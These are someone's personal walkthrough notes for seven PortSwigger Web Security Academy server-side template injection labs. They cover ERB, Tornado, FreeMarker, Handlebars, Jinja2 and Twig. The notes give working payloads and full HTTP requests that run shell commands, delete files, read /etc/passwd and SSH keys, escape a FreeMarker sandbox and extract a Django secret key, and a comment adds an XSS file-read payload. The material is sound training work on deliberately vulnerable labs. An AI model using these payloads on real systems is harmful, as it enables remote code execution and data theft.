# Server-side template injection
https://portswigger.net/web-security/server-side-template-injection

<span style="color:yellow;font-weight:700;font-size:30px">
Exploiting server-side template injection vulnerabilities
</span>
https://portswigger.net/web-security/server-side-template-injection/exploiting


# [1.***Lab: Basic server-side template injection***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

 This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

1. explore site. note that 
```
GET /product?productId=1 HTTP/1.1
```
yeilds "out of stock messege", with redirection to:
```
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
```

2. check for reflection with **test** payload:
GET /?message=test HTTP/1.1
response:
```
HTTP/1.1 200 OK

<div>test</div>
```

test for XSS:
```
GET /?message=<script>alert(1)</script> HTTP/1.1

```
response: **we got am alert box! we have XSS!**

3. it might be a simple XSS - test if it evaluate ERB executable math calculation:
```
GET /?message=<%=+7+*+7+%25> HTTP/1.1
```
response:
```
HTTP/1.1 200 OK

<div>49</div>
```

since reflection yields the mat calculation rather than the string we can deduce it is **template injection** and not simple XSS

4. investigate for build, and version by yielding an error message:
```
GET /?message=<%=foobar%> HTTP/1.1
```
response:
```
<p class=is-warning>
(erb):1:in `&lt;main&gt;&apos;: undefined local variable or method `foobar&apos; for main:Object (NameError)
from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;
from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
from -e:4:in `&lt;main&gt;&apos;</p>
```

***we know we are dealing with Ruby-based ERB engine.***
<!-- (https://www.rubyguides.com/2018/11/ruby-erb-haml-slim/)
This <%= %> tag will be replaced by the templating engine by evaluating the Ruby code inside it.
Notice the equals sign in <%= %>. That tells ERB to render the contents of this tag.
 -->

injection point is parameter "message"

4. investigate injection point structure and methods: 
**request**:
    GET /?message=<%=+self+%25> HTTP/1.1
response:
    HTTP/1.1 200 OK 

    <div>main</div> 

**request**:
GET /?message=<%=+self.class.name+%25> HTTP/1.1
response:
    HTTP/1.1 200 OK 

    <div>Object</div> 

**request**:
    GET /?message=<%25%3d+self.methods+%25> HTTP/1.1
response:
    <div>
    [:inspect, :to_s, :dup, :itself, :yield_self, :then, :taint, :tainted?, :untaint, :untrust, :untrusted?, :trust, :frozen?, :methods, :singleton_methods, :protected_methods, :private_methods, :public_methods, :instance_variables, :instance_variable_get, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :class, :singleton_class, :display, :clone, :hash, :public_send, :method, :public_method, :singleton_method, :define_singleton_method, :extend, :to_enum, :enum_for, :<=>, :===, :=~, :!~, :nil?, :eql?, :respond_to?, :freeze, :object_id, :send, :__send__, :!, :==, :!=, :equal?, :__id__, :instance_eval, :instance_exec]
    </div>

**interesting:**
:instance_eval
:instance_exec


<!-- GET /?message=<%25%3d+self.method(%3ahandle_POST).parameters+%25> HTTP/1.1 -->

**request**:
    GET /?message=<%25%3d+self.method(:instance_exec).parameters+%25> HTTP/1.1

response:
    [[:rest]]

    GET /?message=<%25%3d+self.yield_self+%25> HTTP/1.1
response:
    HTTP/1.1 200 OK

    #<Enumerator:0x000056119b8674e8>

5. after we had fun exploring lets use file.delete command to solve the lab:
**request**:
    GET /?message=<%25%3dFile.delete('/home/carlos/morale.txt')%25> HTTP/1.1

# Lab Solbved


# [2. ***Lab: Basic server-side template injection (code context)***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

 This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

Hint:Take a closer look at the "preferred name" functionality.

<!-- documentation:
https://www.tornadoweb.org/en/stable/guide/templates.html -->

exploer different input points - 
1. comment filed dosent produce errror with payload: **${{<%[%'"}}%\\**
2. email field is protected with email format validation
3. preffered name seems to use a call to "user" object with attribute "name":

**request**:
    POST /my-account/change-blog-post-author-display HTTP/1.1
    
    blog-post-author-display=user.name&csrf=Mo2QxAt6nR1hCmnRC5KdCz97sj7sR8MU

leave a comment at one of the blog comment section - this installs a reflection of the preffered-name parameter:

    Wiener Peter | 25 July 2022

    blah


and send a prffered-name change with {{7*7}}:
    POST /my-account/change-blog-post-author-display HTTP/1.1
    ..
    blog-post-author-display={{7*7}}&csrf=KLKWNX8M7fYpw8oF7T1Z9ERefUjwnboy

check our comment to see if reflection has change an to what:
    {{49}} | 25 July 2022

    comment

we got a math render on the server! possible RCE vector

lets insert some code to delet carlos inside. remmember to leave original value "user.name" snd close with }} in order to avoid empty value error

**final payload:**
    user.name}}{%+import+os;+%}{{os.remove("/home/carlos/morale.txt");}}

#Lab Solved

 For example, in ERB, the documentation reveals that you can list all directories and then read arbitrary files as follows:
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>


# [3.***Lab: Server-side template injection using documentation***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

 This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

1. login with credentials and edit a template of a post:
```
try: ${7*7}
get: 49
```
next in the chart:
```
try: a{*comment*}b
get: a{*comment*}b
```
next in the chart:
```
try: ${"z".join("ab")}
get: [blank]
```

definitly not Mako or smarty

```
try: ${system(echo hello)}
get:FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> system [in template "freemarker" 
```

now we know its FreeMarker!

check doumentation:
https://freemarker.apache.org/docs/index.html

from:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker---code-execution

1. <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
2. [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
3. ${"freemarker.template.utility.Execute"?new()("id")}

payloads 1 and 3 works and provide information. payload2 errors 

``
try: <#assign ex = "freemarker.template.utility.Execute"?new()>${ex('id')}
get: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) 
``
**final payload:**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex('rm /home/carlos/morale.txt')}
```

# success!


# [4.***Lab: Server-side template injection in an unknown language with a documented exploit***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory


explore site observe product 1 is out of stock and triggers a GET response:
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock 

1. study injection point

**request**:
    GET /?message=${{<%[%'"}}%\. HTTP/1.1
response:
    <p class=is-warning>/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
    throw new Error(str);

we are dealing with handlebars template

<!-- 
try: {{7*7}} 

get: /usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
            throw new Error(str);
            Error: Parse error on line 1:
    {{7*7}}
    --^
    Expecting &apos;ID&apos;, &apos;STRING&apos;, &apos;NUMBER&apos;, &apos;BOOLEAN&apos;, &apos;UNDEFINED&apos;, &apos;NULL&apos;, &apos;DATA&apos;, got &apos;INVALID&apos;

searching for:
'CLOSE_RAW_BLOCK', 'CLOSE', 'CLOSE_UNESCAPED', 'OPEN_SEXPR', 'CLOSE_SEXPR', 'ID', 'OPEN_BLOCK_PARAMS', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NU

 search yields:
 Handlebars crash when use helpers inside tag #1157  -->


2. search for handlebars payload

*(from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)*

**RCE payload**:
```
    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}
```
3. copy, urlencode and send request:
```
    GET /?message={{%23with+"s"+as+|string|}}++{{%23with+"e"}}++++{{%23with+split+as+|conslist|}}++++++{{this.pop}}++++++{{this.push+(lookup+string.sub+"constructor")}}++++++{{this.pop}}++++++{{%23with+string.split+as+|codelist|}}++++++++{{this.pop}}++++++++{{this.push+"return+require('child_process').execSync('ls+-la')%3b"}}++++++++{{this.pop}}++++++++{{%23each+conslist}}++++++++++{{%23with+(string.sub.apply+0+codelist)}}++++++++++++{{this}}++++++++++{{/with}}++++++++{{/each}}++++++{{/with}}++++{{/with}}++{{/with}}{{/with}} HTTP/1.1
```
response:
```
    drwxr-xr-x 1 carlos carlos   45 Jul 25 21:28 .
    drwxr-xr-x 1 root   root     20 Jul 20 04:18 ..
    -rw-rw-r-- 1 carlos carlos  132 Jul 25 21:28 .bash_history
    -rw-r--r-- 1 carlos carlos  220 Feb 25  2020 .bash_logout
    -rw-r--r-- 1 carlos carlos 3771 Feb 25  2020 .bashrc
    -rw-r--r-- 1 carlos carlos  807 Feb 25  2020 .profile
    -rw-rw-r-- 1 carlos carlos 6816 Jul 25 21:28 morale.txt
```

4. tweak the code to delete carlos:
```
    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}
```
**request**:
GET {{%23with+"s"+as+|string|}}++{{%23with+"e"}}++++{{%23with+split+as+|conslist|}}++++++{{this.pop}}++++++{{this.push+(lookup+string.sub+"constructor")}}++++++{{this.pop}}++++++{{%23with+string.split+as+|codelist|}}++++++++{{this.pop}}++++++++{{this.push+"return+require('child_process').execSync('rm+/home/carlos/morale.txt')%3b"}}++++++++{{this.pop}}++++++++{{%23each+conslist}}++++++++++{{%23with+(string.sub.apply+0+codelist)}}++++++++++++{{this}}++++++++++{{/with}}++++++++{{/each}}++++++{{/with}}++++{{/with}}++{{/with}}{{/with}} HTTP/1.1

# Lab Solveed!

hint:
    ${T(java.lang.System).getenv()}



# [5. ***Lab: Server-side template injection with information disclosure via user-supplied objects***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

framework's secret key:
> Summary: The Django secret key is used to provide cryptographic signing. This key is mostly used to sign session cookies. If one were to have this key, they would be able to modify the cookies sent by the application.

*https://docs.gitguardian.com/secrets-detection/detectors/specifics/django_secret_key*

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r 

try:
    ${{<%[%'"}}%\.
response:
    Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"'

we are dealing with **django**, find documentation and exploit online:

**documentation**:
https://docs.djangoproject.com/en/4.0/topics/templates/

**exploit**:
from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#django-templates

> Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.

Detection:
    {% csrf_token %} # Causes error with Jinja2
    {{ 7*7 }}  # Error with Django Templates
    ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r

payloads 1 and 2 errors out, payload 3 returns **ih0vr1097d121r**. it looks like a Jinja2 engine
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.

find jinja2 exploits:

*(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file*

>If the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
*Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement*

try: 
    <pre>{% debug %}</pre>

observe we get a list of available python commands. look for interesting functions: 
 'settings':

**payload**:
{{settings.SECRET_KEY}}

observe secret-key in response: *w2lvhizvv21792mim7ewptxez8rvdyrs* - copy and paste as solution

# Lab Solved

<!-- 
found and also xss didnt work for my purpose:

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

{{ '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");alert(x.responseText);</script>' }} -->

material:

 For example, in the Java-based template engine Velocity, you have access to a ClassTool object called $class. Studying the documentation reveals that you can chain the $class.inspect() method and $class.type property to obtain references to arbitrary objects. In the past, this has been exploited to execute shell commands on the target system as follows:
    $class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")


# [6. ***Lab: Server-side template injection in a sandboxed environment***](https://portswigger.net/web-security/server-side-template-injection/eploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

1. try using **Execute** to invoke action:
try:
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex('cat /home/carlos/morale.txt')}
get:
FreeMarker template error: Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons. 

**Execute** is fobidden

2. find alternative way to execute (*from portswiggers solution:)
try:
```
${object.getClass()}
```
get:
```
FreeMarker template error (..): The following has evaluated to null or missing: ==> object 
```
ther is access to 

try:
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
get:
```
55 49 107 98 57 106 103 120 52 110 109 115 99 118 108 53 119 113 49 109 

```
encode to Ascii (easiet with CyberCheff: https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=NTUgNDkgMTA3IDk4IDU3IDEwNiAxMDMgMTIwIDUyIDExMCAxMDkgMTE1IDk5IDExOCAxMDggNTMgMTE5IDExMyA0OSAxMDk)

Submit solution:
71kb9jgx4nmscvl5wq1m

# Lab solved

payload analsys:
```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```


# [7. ***Lab: Server-side template injection with a custom exploit***](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 


1. log in and explore site. 

in comment try to comment {7*7} see error:
```
PHP Fatal error: Uncaught Twig_Error_Syntax:...
... 
```
we are dealing with **twig** syntax


in upload avater option upload valid file and try to upload not valid file - notice:
```
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/markdown in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/SQLI Labs ...', 'text/markdown')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

write down path **/home/carlos/User.php** and method **User->setAvatar**

2.  use the **user.setAvatr** method in preffered name radio selection:
payload:
```
user.setAvatar('/etc/passwd','image/jpg')
```

full request:
```
POST /my-account/change-blog-post-author-display HTTP/1.1

blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
```

from the comment open the avatar picture - note a file with etc/passwd content has be downloaded! we can access arbitary files on the system


3. check the requested file (from lab description + cralos homepage):
payload:
```
user.setAvatar('/home/carlos/User.php','image/jpg')
```

full request:
```
POST /my-account/change-blog-post-author-display HTTP/1.1

blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
```
note a file downloaded with all the user methods available, one of them is **gdprDelete()** which have a **rm** command - just what we need:
```php
    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }
```

4. check the requested file (from lab description + cralos homepage):
payload:
```
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

full request:
```
POST /my-account/change-blog-post-author-display HTTP/1.1

blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')&csrf=kREzFkT6BeBl098KOV2Z010YfUDGcuSL
```
note a file download with 
```
Nothing to see here :)
```
very funny portswigger :)

4. delete the file with **gdprDelete**:
A. set file as avatar:
```
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

B. delete avatar:
```
user.gdprDelete()
```
refresh the comment page and upload the avatar picture to execute command


# Lab Solved!


